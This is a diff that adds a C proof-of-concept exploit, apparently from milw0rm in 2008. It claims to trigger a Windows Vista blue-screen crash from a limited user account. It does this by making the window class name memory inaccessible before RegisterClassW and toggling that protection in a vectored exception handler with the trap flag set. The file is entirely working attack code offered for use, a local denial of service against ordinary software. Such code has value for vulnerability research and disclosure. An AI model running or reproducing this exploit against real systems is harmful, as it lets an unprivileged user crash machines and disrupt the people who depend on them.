@@ -1,0 +1,77 @@
+// //////////////////////////////////////////////////////////////
+// Windows Vista BSoD (Access violation) from limited account. //
+// Tested on Home Premium & Ultimate @ October 05 2008         //
+/////////////////////////////////////////////////////////////////
+#include <stdio.h>
+#include <windows.h>
+
+WCHAR szClass[] = L"BSODClass";
+
+int ExceptionHandler(EXCEPTION_POINTERS* lpExceptionInfo);
+typedef void (WINAPI* pFunc)(ULONG ulFirst, LPVOID lpHandler);
+pFunc pRtlAddVectoredExceptionHandler;
+
+typedef struct
+{
+    DWORD dwWriteViolation;
+    LPVOID lpAddress;
+} EXCEPTION_ACCESS_VIOLATION_PARAMS;
+
+int main()
+{
+    WNDCLASSW wc;
+    DWORD dwOldProt;
+
+    printf("Windows Vista BSoD from usermode/limited account.\n"
+           "Coded by. Defsanguje - October 05 2008\n");
+
+    // Setup vectored exception handler. SEH would work also.
+    pRtlAddVectoredExceptionHandler = (pFunc)GetProcAddress((HMODULE)GetModuleHandle("ntdll.dll"),
+                                                            "RtlAddVectoredExceptionHandler");
+    (*pRtlAddVectoredExceptionHandler)(TRUE, ExceptionHandler);
+
+    // Dummy data
+    wc.style         = 0;
+    wc.lpfnWndProc   = NULL;
+    wc.cbClsExtra    = 0;
+    wc.cbWndExtra    = 0;
+    wc.hInstance     = GetModuleHandle(NULL);
+    wc.hIcon         = NULL;
+    wc.hCursor       = LoadCursor(NULL, IDC_ARROW);
+    wc.hbrBackground = GetStockObject(HOLLOW_BRUSH);
+    wc.lpszMenuName  = NULL;
+    wc.lpszClassName = szClass;
+
+    VirtualProtect(szClass, 1, PAGE_NOACCESS, &dwOldProt);
+    RegisterClassW(&wc);
+
+    printf("You shouldn't see this");
+    return 0;
+}
+
+int ExceptionHandler(EXCEPTION_POINTERS* lpExceptionInfo)
+{
+    static LPVOID lpLastAddress;
+    static DWORD dwOldProt;
+    EXCEPTION_ACCESS_VIOLATION_PARAMS* avParams;
+    switch(lpExceptionInfo->ExceptionRecord->ExceptionCode)
+    {
+        case EXCEPTION_ACCESS_VIOLATION:
+            avParams = (EXCEPTION_ACCESS_VIOLATION_PARAMS*)lpExceptionInfo->ExceptionRecord->ExceptionInformation;
+            VirtualProtect(avParams->lpAddress, 1, PAGE_READWRITE, &dwOldProt);
+            lpLastAddress = avParams->lpAddress;
+
+            // Set trap flag
+            lpExceptionInfo->ContextRecord->EFlags |= 0x100;
+            break;
+        case STATUS_SINGLE_STEP:
+            VirtualProtect(lpLastAddress, 1, PAGE_NOACCESS, &dwOldProt);
+            break;
+        default:
+            break;
+    }
+    return EXCEPTION_CONTINUE_EXECUTION;
+;
+}
+
+// milw0rm.com [2008-10-04]
